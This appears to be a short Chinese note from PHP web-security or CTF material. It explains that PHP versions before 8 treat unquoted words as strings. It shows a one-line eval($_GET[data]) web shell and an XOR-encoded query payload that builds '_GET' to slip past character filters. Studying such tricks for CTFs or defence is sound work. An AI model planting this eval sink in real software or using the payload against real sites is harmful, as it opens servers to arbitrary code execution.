- php(不含PHP8)会把没有加引号的单词转换为字符串。
- ```php
  <?php
  eval($_GET[data]); # 这里的data会被识别为字符串
  ?>
  # 然后传入?data=%ff%ff%ff%ff^%a0%b8%ba%ab也会被当成字符串
  ```